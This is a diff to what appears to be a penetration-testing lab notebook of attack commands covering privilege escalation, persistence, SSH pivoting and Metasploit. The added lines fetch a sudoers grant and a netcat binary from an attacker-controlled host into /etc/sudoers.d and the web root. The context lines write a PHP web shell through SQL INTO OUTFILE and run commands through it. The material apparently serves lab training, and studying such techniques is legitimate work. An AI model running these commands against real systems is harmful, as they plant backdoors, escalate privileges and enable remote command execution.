@@ -330,6 +330,10 @@ passwd
 su - backup
 su - root
 
+python -m http.server 8080 &
+sudo curl -s http://172.16.10.1:8080/ch09/add-sudo-to-user -o /etc/sudoers.d/add-sudo-to-user
+sudo curl -s http://172.16.10.1:8080/LAB-PLAYGROUND/assets/nc -o /var/www/nc
+
 # Kernal Exploits
 
 uname -r -v
@@ -341,7 +345,6 @@ sudo curl http://172.16.10.1:8080/passwords.txt -o $(pwd)/passwords.txt
 
 unix-privesc-check standard
 unix-privesc-check detailed
-
 
 # Persistence
 
@@ -418,7 +421,6 @@ cat /etc/crontab
 sudo crontab -u root -l
 crontab -u backup -l
 
-
 # Probing Corporate Network
 
 cat /etc/services | tail
@@ -476,7 +478,7 @@ ssh -v -N -L 2222:10.1.0.14:22 backup@172.16.10.13
 netstat -atunp | grep 2222
 ssh root@127.0.0.1 -p 2222 -i /home/kali/.ssh/id_rsa
 
-# Metasplot
+# Metasploit
 
 msfconsole
 use auxiliary/scanner/redis/file_upload
@@ -506,3 +508,6 @@ http://localhost:8888/uploads/file_write3.txt
 SELECT "<?php system($_GET['cmd']); ?>" into OUTFILE "/var/www/html/uploads/s.php"
 http://localhost:8888/uploads/s.php?cmd=id
 
+# Defense Evasion And Exfiltration
+
+TODO
